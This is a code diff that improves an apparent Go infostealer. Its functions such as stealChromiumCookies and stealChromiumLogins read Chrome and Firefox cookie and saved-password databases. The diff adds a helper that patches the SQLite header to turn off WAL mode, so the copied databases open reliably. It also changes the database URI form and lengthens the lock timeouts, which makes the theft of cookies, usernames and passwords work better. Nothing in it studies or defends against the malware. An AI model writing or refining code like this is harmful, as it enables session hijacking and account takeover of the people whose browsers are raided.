@@ -147,6 +147,23 @@ func runStealer() string {
 	return string(out)
 }
 
+func disableWALMode(dbFile string) {
+	f, err := os.OpenFile(dbFile, os.O_RDWR, 0o644)
+	if err != nil {
+		return
+	}
+	var header [20]byte
+	n, _ := f.ReadAt(header[:], 0)
+	if n >= 20 && header[18] == 2 {
+		header[18] = 1
+		header[19] = 1
+		f.WriteAt(header[18:20], 18)
+	}
+	f.Close()
+	os.Remove(dbFile + "-wal")
+	os.Remove(dbFile + "-shm")
+}
+
 func stealChromiumCookies(userDataPath string, browserName string, browserExe string) (string, []string) {
 	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"}
 	var allCookies strings.Builder
@@ -171,13 +188,14 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 
 		var dbPath string
 		if copyOk {
+			disableWALMode(tmpPath)
 			dbPath = tmpPath
 			defer os.Remove(tmpPath)
 			defer os.Remove(tmpPath + "-wal")
 			defer os.Remove(tmpPath + "-shm")
 		} else {
 			clean := strings.ReplaceAll(cookiePath, string(os.PathSeparator), "/")
-			dbPath = "file:" + clean + "?immutable=1"
+			dbPath = "file:///" + clean + "?immutable=1"
 		}
 
 		type queryResult struct {
@@ -192,8 +210,7 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 				return
 			}
 			defer db.Close()
-			db.Exec("PRAGMA busy_timeout = 2000")
-			db.Exec("PRAGMA journal_mode = WAL")
+			db.Exec("PRAGMA busy_timeout = 10000")
 
 			rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
 			if err != nil {
@@ -256,11 +273,12 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 
 		var dbPath string
 		if copyOk {
+			disableWALMode(tmpPath)
 			dbPath = tmpPath
 			defer os.Remove(tmpPath)
 		} else {
 			clean := strings.ReplaceAll(loginPath, string(os.PathSeparator), "/")
-			dbPath = "file:" + clean + "?immutable=1"
+			dbPath = "file:///" + clean + "?immutable=1"
 		}
 
 		ch := make(chan string, 1)
@@ -271,7 +289,7 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 				return
 			}
 			defer db.Close()
-			db.Exec("PRAGMA busy_timeout = 2000")
+			db.Exec("PRAGMA busy_timeout = 10000")
 
 			rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
 			if err != nil {
@@ -344,8 +362,8 @@ func stealFirefoxCookies(profilesPath string, browserExe string) (string, []stri
 			errs = append(errs, fmt.Sprintf("firefox/%s open: %v", e.Name(), err))
 			continue
 		}
-		db.Exec("PRAGMA busy_timeout = 3000")
-		db.Exec("PRAGMA journal_mode = WAL")
+		disableWALMode(tmpPath)
+		db.Exec("PRAGMA busy_timeout = 5000")
 
 		rows, err := db.Query("SELECT host, name, path, value, expiry FROM moz_cookies")
 		if err != nil {
